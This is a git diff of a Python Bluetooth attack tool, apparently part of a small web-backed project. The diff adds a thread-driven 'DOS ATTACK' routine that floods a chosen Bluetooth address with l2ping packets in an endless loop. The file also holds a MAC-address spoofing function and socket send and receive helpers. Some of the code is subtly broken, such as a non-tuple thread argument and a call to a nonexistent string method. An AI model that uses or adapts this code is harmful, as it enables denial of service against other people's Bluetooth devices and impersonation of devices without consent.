@@ -1,5 +1,6 @@
 import asyncio
 #import bluetooth
+import threading
 import json
 import subprocess
 from bleak import BleakScanner
@@ -26,20 +27,27 @@ def BluetoothToJSON(devices):
   f.close()
   return devicesJSON
 
+# DOS ATTACK
+stopDos = threading.Event()
+def startDOS(BluetoothAddress):
+  thread = threading.Thread(target=InfiniteBluetoothDoS, args=(BluetoothAddress))
+  thread.start()
+  return thread
+
+def stopDOS(thread):
+  stopDos.set()
+  thread.join()
+
+def InfiniteBluetoothDoS(BluetoothAddress):
+  while not stopDos.is_set():
+    try:
+      subprocess.call(['sudo', 'l2ping', '-s', '512', '-t', '0', '-f', f"{BluetoothAddress}"])
+    except Exception as e:
+      print(f"[@] Error: {e}")
+
 # SCAN FOR SERVICES ON BLUETOOTH DEVICE
 # async def BluetoothServiceScanner(BluetoothAddress):
 #   return bluetooth.find_service(address=BluetoothAddress)
-
-# # How to use
-# TargetAddress = input("[@] Enter target adddress: ")
-# Services = BluetoothServiceScan(TargetAddress)
-# for Service in Services:
-#     print(f"Service Name: {Service['name']}")
-#     print(f"    Host: {Service['host']}")
-#     print(f"    Description: {Service['description']}")
-#     print(f"    Provider: {Service['provider']}")
-#     print(f"    Port: {Service['port']}")
-#     print(f"    Protocol: {Service['protocol']}")
 
 # CHANGE MAC ADDRESS FOR SOME BLUETOOTH DEVICES ** LINUX ONLY
 def SpoofingMacAddress(Interface, NewMac):
@@ -50,10 +58,10 @@ def SpoofingMacAddress(Interface, NewMac):
       return
     PartList = NewMac.split(':')
     FinalMacAddress = ['0x' + PartList[5], '0x' + PartList[4], '0x' + PartList[3], '0x' + PartList[2], '0x' + PartList[1], '0x' + PartList[0]]
-    print(FinalMacAddress)
+    #print(FinalMacAddress)
     subprocess.call(['sudo', 'hcitool', 'cmd', '0x3f', '0x001', FinalMacAddress[0], FinalMacAddress[1], FinalMacAddress[2], FinalMacAddress[3], FinalMacAddress[4], FinalMacAddress[5]])
     subprocess.call(['sudo', 'service', 'bluetooth', 'restart'])
-    print(f"[+] Successfully changed {Interface} MAC address to {NewMac}")
+    #print(f"[+] Successfully changed {Interface} MAC address to {NewMac}")
   except Exception as e:
     print(f"[!] Error: {e}")
 
@@ -68,25 +76,11 @@ def SpoofingMacAddress(Interface, NewMac):
 #       print(f"[!] Error: {e}")
 
 # COMMUNICATE WITH BLUETOOTH DEVICE
-def BluetoothCommunicateWithDevice(Socket):
-  Data = ""
-  while Data != "q":
-    Data = input("[@] Enter message to send:")
-    Socket.send(Data.encrypt())
-    RecvData = Socket.recv(1024)
-    print(f"[#] Recv data: {RecvData}")
-    Socket.close()
+def blComsReceive(Socket):
+  return Socket.recv(1024)
 
-# TargetAddress = input("[@] Enter target address: ")
-# TargetPort = input("[@] Enter target port: ")
-# TargetProtocol = input("[@] Enter target protocol: ")
-
-# ChosenProtocol = bluetooth.RFCOMM
-# if TargetProtocol == "L2CAP":
-#     ChosenProtocol = bluetooth.L2CAP
-
-# Socket = BluetoothForceConnectService(TargetAddress, TargetPort, ChosenProtocol)
-# BluetoothCommunicateWithDevice(Socket)
+def blComsSend(Socket, data):
+  Socket.send(data.encrypt())
 
 def deleteDevices():
   f = open("./static/python/devices", "w")
